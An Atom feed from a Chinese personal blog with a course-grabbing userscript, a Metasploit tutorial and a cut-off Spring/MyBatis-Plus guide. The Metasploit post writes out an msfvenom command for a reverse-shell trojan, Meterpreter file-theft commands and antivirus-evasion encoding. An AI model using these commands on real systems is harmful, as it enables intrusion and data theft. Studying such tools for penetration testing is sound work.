<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-29T17:14:20+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
&lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
  &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
&lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
  &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
</subtitle><entry><title type="html">西华大学抢课脚本</title><link href="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/" rel="alternate" type="text/html" title="西华大学抢课脚本" /><published>2020-06-29T00:00:00+08:00</published><updated>2020-06-29T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;环境配置&quot;&gt;环境配置&lt;/h1&gt;

&lt;p&gt;安装油猴插件&lt;/p&gt;

&lt;h1 id=&quot;脚本&quot;&gt;脚本&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// ==UserScript==
// @name         西华大学选课脚本
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://*/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';
  /**
   * 西华大学一键式选课脚本
   * 此脚本只能简单的代替你点击选课
   * 不保证成功率
   * 使用此脚本是您自愿使用的造成的损失作者概不负责·
   * @author WDF
   * 有问题请联系我
   * @QQ 2921235963
   */

  //把名字替换为你需要的课程名称
  let courseName = [&quot;足球&quot;, &quot;网球&quot;,&quot;桥牌&quot;]

  document.getElementsByClassName(&quot;panel panel-info&quot;)[0].getElementsByClassName(&quot;nav nav-tabs sl_nav_tabs&quot;)[0].getElementsByTagName(&quot;li&quot;)[1].getElementsByTagName(&quot;a&quot;)[0].click()

  let o = document.getElementById(&quot;more&quot;)
  for (let i = 0; i &amp;lt; 10; i++) {
    setTimeout(() =&amp;gt; {
      o.getElementsByTagName(&quot;a&quot;)[0].click()
    }, 1000)
  }

  let cnt = 0

  // 等待加载出课程
  setTimeout(() =&amp;gt; {
    console.log('loading...')

    //进入选课界面
    let courseList = document.getElementsByClassName(&quot;panel panel-info&quot;)
    for (let j = 0; j &amp;lt; courseName.length; j++) {
      cnt = cnt + 1
      if (j &amp;gt; 0)
        console.log(courseName[j - 1] + '选课成功!\n')

      console.log('当前准备选择的课程:' + courseName[j])
      let i
      // 搜索课程
      for (i = 1; i &amp;lt; courseList.length; i++) {
        setTimeout(() =&amp;gt; {
        }, 1000)

        let oo = courseList[i].getElementsByClassName(&quot;panel-heading kc_head&quot;)[0].getElementsByClassName(&quot;panel-title&quot;)[0]
        let thisText = oo.getElementsByClassName(&quot;kcmc&quot;)[0].getElementsByTagName(&quot;a&quot;)[0].innerText

        if (courseName[j] == thisText) {
          courseList[i].getElementsByClassName(&quot;panel-heading kc_head&quot;)[0].getElementsByClassName(&quot;panel-title&quot;)[0].click()
          break;
        }
      }
      let flag = false
      let map = new Map()
      const timer = setInterval(() =&amp;gt; {
        if (flag)
          clearInterval(timer)
        // 获取当前课程列表
        let list = courseList[i].getElementsByClassName(&quot;panel-body table-responsive&quot;)[0].getElementsByClassName(&quot;table table-hover&quot;)[0].getElementsByClassName(&quot;body_tr&quot;)

        for (let k = 0; k &amp;lt; list.length; k++) {
          if (map.has(k))
            continue
          let o = list[k].getElementsByClassName(&quot;an&quot;)[0].getElementsByClassName(&quot;btn btn-primary btn-sm&quot;)[0]
          if (o == null)
            o = list[k].getElementsByClassName(&quot;an&quot;)[0].getElementsByClassName(&quot;btn btn-danger btn-sm&quot;)[0]
          // console.log(k+&quot;---&quot;+o.innerText)
          if (o.innerText == &quot;选课&quot;) {
            o.click()
            setTimeout(() =&amp;gt; {
              let content = document.getElementsByClassName(&quot;modal-content&quot;)[0]
              if (content != null) {
                let message = content.getElementsByClassName(&quot;modal-body&quot;)[0].getElementsByClassName(&quot;bootbox-body&quot;)[0].getElementsByClassName(&quot;alert alert-modal&quot;)[0].innerText

                if (message == &quot;所选教学班的上课时间与其他教学班有冲突！&quot;)
                  map.set(k, '1')
                else if (message == &quot;一门课程最多可选1个志愿！&quot;)
                  clearInterval(timer)
                var ok_btn = content.getElementsByClassName(&quot;modal-footer ui-draggable-handle&quot;)[0].getElementsByClassName(&quot;btn btn-sm btn-default&quot;)[0]
                if (ok_btn != null)
                  ok_btn.click()
              }
            }, 750)
          } else {
            flag = true
            clearInterval(timer)
          }
          if (flag)
            break
        }
      }, 1500)

    }
  }, 2000)
  if (cnt == courseName.length)
    console.log('选课成功')


  // Your code here...
})();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;感谢吴同学分享的脚本,[github](https://github.com/Sherlockouo/script/tree/master/study&lt;/p&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">metasploit使用总结</title><link href="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="metasploit使用总结" /><published>2020-06-27T00:00:00+08:00</published><updated>2020-06-27T00:00:00+08:00</updated><id>http://localhost:4000/_posts/metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;h2 id=&quot;官网地址&quot;&gt;&lt;a href=&quot;https://www.metasploit.com/&quot;&gt;官网地址&lt;/a&gt;&lt;/h2&gt;

&lt;h2 id=&quot;版本&quot;&gt;版本&lt;/h2&gt;

&lt;p&gt;Metasploit的四个版本：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pro&lt;/strong&gt;：适用于渗透测试人员和IT安全团队&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Express&lt;/strong&gt;：适用于一般IT人员&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Community&lt;/strong&gt;：适用于小公司和学生&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Framework&lt;/strong&gt;：适用于开发人员和安全研究人员&lt;/p&gt;

&lt;h2 id=&quot;linux平台上安装&quot;&gt;Linux平台上安装&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \
chmod 755 msfinstall &amp;amp;&amp;amp; \
./msfinstall
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;详细过程参考官网&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;初始化&quot;&gt;初始化&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;service postgresql start &amp;amp;&amp;amp; msfdb init &amp;amp;&amp;amp; msfconsole
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是数据库初始化&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;metasploit结构&quot;&gt;Metasploit结构&lt;/h1&gt;

&lt;h1&gt;&lt;img src=&quot;/home/admin233/博客/verylazycat.github.io/img/meta.png&quot; alt=&quot;meta&quot; /&gt;&lt;/h1&gt;

&lt;h2 id=&quot;目录结构&quot;&gt;目录结构&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;data目录：里面存放一些可编辑的文件，主要是给Metasploit使用
documentation目录：提供一些MSF的介绍文档等
external目录：源文件和第三方的库
lib目录：MSF框架的主要组成部分
modules目录：MSF的模块存放位置
plugins目录：存放Metasploit的插件
scripts目录：存放Meterpreter代码（shell code）或者是其他的脚本文件
tools目录：各种各样实用的命令行工具
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;help&quot;&gt;HELP&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)
### Examples
Terminate the first sessions:
    sessions -k 1
Stop some extra running jobs:
    jobs -k 2-6,7,8,11..15
Check a set of IP addresses:
    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
Target a set of IPv6 hosts:
    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
Target a block from a resolved domain name:
    set RHOSTS www.example.test/24
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;meterpreter&quot;&gt;Meterpreter&lt;/h1&gt;

&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;

&lt;p&gt;Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。&lt;/p&gt;

&lt;p&gt;最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。&lt;/p&gt;

&lt;p&gt;需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况&lt;/p&gt;

&lt;h2 id=&quot;常用的反弹类型&quot;&gt;常用的反弹类型&lt;/h2&gt;

&lt;h3 id=&quot;reverse_tcp&quot;&gt;reverse_tcp&lt;/h3&gt;

&lt;p&gt;这是一个基于TCP的反向链接反弹shell, 使用起来很稳定&lt;/p&gt;

&lt;p&gt;使用下列命令生成一个Linux下反弹shell木马：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=你的IP lport=监听端口  -f elf -o shell
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;关于生成木马后续再提&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;然后我们打开Metasploit，使用模块handler，设置payload，注意：这里设置的payload要和我们生成木马所使用的payload一样,配置好参数就可以开始监听,当目标运行木马们就可以反弹shell了&lt;/p&gt;

&lt;h3 id=&quot;reverse_http&quot;&gt;reverse_http&lt;/h3&gt;

&lt;p&gt;基于http方式的反向连接，在网速慢的情况下不稳定&lt;/p&gt;

&lt;h3 id=&quot;bind_tcp&quot;&gt;bind_tcp&lt;/h3&gt;

&lt;p&gt;这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST&lt;/p&gt;

&lt;h2 id=&quot;payload&quot;&gt;Payload&lt;/h2&gt;

&lt;p&gt;Metasploit中的Payload模块主要有以下三种类型：&lt;/p&gt;

&lt;p&gt;-Single&lt;/p&gt;

&lt;p&gt;-Stager&lt;/p&gt;

&lt;p&gt;-Stage&lt;/p&gt;

&lt;p&gt;Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似&lt;a href=&quot;https://en.wikipedia.org/wiki/Netcat&quot;&gt;netcat&lt;/a&gt;这样的非metasploit处理工具所捕捉到。&lt;/p&gt;

&lt;p&gt;Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信。&lt;/p&gt;

&lt;p&gt;Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制&lt;/p&gt;

&lt;h2 id=&quot;meterpreter的常用命令&quot;&gt;Meterpreter的常用命令&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;help# 查看Meterpreter帮助
background#返回，把meterpreter后台挂起
bgkill# 杀死一个背景 meterpreter 脚本
bglist#提供所有正在运行的后台脚本的列表
bgrun#作为一个后台线程运行脚本
channel#显示活动频道
sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用
sesssions -k  number #与会话进行交互
close# 关闭通道
exit# 终止 meterpreter 会话
quit# 终止 meterpreter 会话
interact id #切换进一个信道
run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
irb# 进入 Ruby 脚本模式
read# 从通道读取数据
write# 将数据写入到一个通道
run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本
use# 加载 meterpreter 的扩展
load/use#加载模块

Resource#执行一个已有的rc脚本

2.文件系统命令

cat c:\boot.ini#查看文件内容,文件必须存在

del c:\boot.ini #删除指定的文件

upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\

download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/

edit c:\boot.ini  # 编辑文件

getlwd#打印本地目录

getwd#打印工作目录

lcd#更改本地目录

ls#列出在当前目录中的文件列表

lpwd#打印本地目录

pwd#输出工作目录

cd c:\\ #进入目录文件下

rm file #删除文件

mkdir dier #在受害者系统上的创建目录

rmdir#受害者系统上删除目录

dir#列出目标主机的文件和文件夹信息

mv#修改目标主机上的文件名

search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc

meterpreter &amp;gt; search -f autoexec.bat  #搜索文件

meterpreter &amp;gt; search -f sea*.bat c:\\xamp\\

enumdesktops     #用户登录数
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;msfvenom&quot;&gt;msfvenom&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;木马生成工具&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;help-1&quot;&gt;HELP&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Options:
-p, --payload    &amp;lt;payload&amp;gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;amp;#039;-&amp;amp;#039;或者stdin指定
-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, --nopsled    &amp;lt;length&amp;gt;        为payload预先指定一个NOP滑动长度
-f, --format     &amp;lt;format&amp;gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
-a, --arch       &amp;lt;architecture&amp;gt;  指定payload的目标架构
--platform   &amp;lt;platform&amp;gt;      指定payload的目标平台
-s, --space      &amp;lt;length&amp;gt;        设定有效攻击荷载的最大长度
-b, --bad-chars  &amp;lt;list&amp;gt;          设定规避字符集，比如: &amp;amp;#039;\x00\xff&amp;amp;#039;
-i, --iterations &amp;lt;count&amp;gt;         指定payload的编码次数
-c, --add-code   &amp;lt;path&amp;gt;          指定一个附加的win32 shellcode文件
-x, --template   &amp;lt;path&amp;gt;          指定一个自定义的可执行文件作为模板
-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
--payload-options            列举payload的标准选项
-o, --out   &amp;lt;path&amp;gt;               保存payload
-v, --var-name &amp;lt;name&amp;gt;            指定一个自定义的变量，以确定输出格式
--shellest                   最小化生成payload
-h, --help                       查看帮助选项
--help-formats               查看msf支持的输出格式列表
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;生成payload&quot;&gt;&lt;strong&gt;生成payload&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;生成payload，有有两个必须的选项：-p -f&lt;/p&gt;

&lt;p&gt;使用-p 来指定要使用的payload&lt;/p&gt;

&lt;p&gt;可以使用下面的命令来查看所有msf可用的payload列表&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l payloads
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-p选项也支持使用使用自定义的payload，需要使用 “-“，比如:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用-f 来指定payload的输出格式&lt;/p&gt;

&lt;p&gt;使用下面的命令，可以产看msf支持的输出格式&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom --help-formats
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;payload编码&quot;&gt;&lt;strong&gt;payload编码&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;如果你使用了-b选项（设定了规避字符集），会自动调用编码器&lt;/p&gt;

&lt;p&gt;其他情况下，你需要使用-e选项来使用编码模块，例如&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以使用下面的命令，来查看可用的编码器&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l encoders
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案&lt;/p&gt;

&lt;p&gt;可以使用下面的命令来进行迭代编码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;规避字符&quot;&gt;&lt;strong&gt;规避字符&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -b &amp;amp;#039;\x00&amp;amp;#039; -f raw
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">veu&amp;amp;spring项目开发</title><link href="http://localhost:4000/_posts/2020-06-25-veu&spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/" rel="alternate" type="text/html" title="veu&amp;spring项目开发" /><published>2020-06-25T00:00:00+08:00</published><updated>2020-06-25T00:00:00+08:00</updated><id>http://localhost:4000/_posts/veu&amp;spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-25-veu&amp;spring%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://mp.baomidou.com/guide/#%E7%89%B9%E6%80%A7&quot;&gt;mybati-plus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;数据库配置&quot;&gt;数据库配置&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `name` varchar(45) NOT NULL,
  `age` int NOT NULL,
  `email` varchar(45) NOT NULL,
  `create_time` datetime DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id_UNIQUE` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;一般需要在数据库添加&lt;code&gt;Create_time&lt;/code&gt;和&lt;code&gt;update_time&lt;/code&gt;字段,用于记录创建时间和修改时间,可以在操作数据库代码中添加相应代码去实现,不过可以在实体类中加上@TableField注解,再写一个handler继承MetaObjectHandler,实现&lt;code&gt;InsertFill&lt;/code&gt;和&lt;code&gt;updateFill&lt;/code&gt;方法,从而简化代码&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;DROP TABLE IF EXISTS `product`;
CREATE TABLE `product` (
  `id` bigint NOT NULL,
  `name` varchar(30) DEFAULT NULL,
  `price` int DEFAULT '0',
  `version` int DEFAULT '0' COMMENT '乐观锁',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;version 字段 在后续解决同时操作数据库发生冲突,需在其实体类对于的数据上添加@version注解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;applicationproperties配置&quot;&gt;application.properties配置&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-properties&quot;&gt;spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:3306/mybatis_plus?serverTimezone=GMT%2B8
spring.datasource.username=name
spring.datasource.password=pass
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;实体类&quot;&gt;实体类&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建entity package&lt;/li&gt;
  &lt;li&gt;创建User.class&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.entity;

import com.baomidou.mybatisplus.annotation.FieldFill;
import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import lombok.Data;

import java.util.Date;

@Data
public class User {
    @TableId(type =  IdType.AUTO)
    private  long id;
    private  String name;
    private  Integer age;
    private  String email;

    @TableField(fill = FieldFill.INSERT)
    private Date create_time;

    @TableField(fill = FieldFill.INSERT_UPDATE)
    private  Date update_time;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;@Data 注解:来源与&lt;code&gt;lombok&lt;/code&gt;,需要配置插件,主要功能是简化,自动生成getter和setter&lt;/li&gt;
    &lt;li&gt;@TableId:主键注解,具体type参考官网&lt;/li&gt;
    &lt;li&gt;@TableField:字段注解(非主键),后续创建类去继承MetaObjectHandler,实现InsertFill和updateFill等主要方法&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Product&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.entity;

import com.baomidou.mybatisplus.annotation.Version;
import lombok.Data;

@Data
public class Product {
    private  Long id;
    private  String name;
    private  Integer price;

    @Version
    private  Integer version;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;@Version:乐观锁注解,为了在并发使用数据库时不产生冲突,具体参考测试数据库&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;mapper&quot;&gt;Mapper&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;创建mapper package&lt;/li&gt;
  &lt;li&gt;在mapper下创建UserMapper&lt;code&gt;接口&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.mapper;

import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.lazycat.mybatis_plus.entity.User;
import org.springframework.stereotype.Repository;

@Repository
public interface UserMapper extends BaseMapper&amp;lt;User&amp;gt; {
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是要继承&lt;code&gt;BaseMapper&lt;/code&gt;,泛型根据自己定义的实体类&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;ProductMapper&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package com.lazycat.mybatis_plus.mapper;

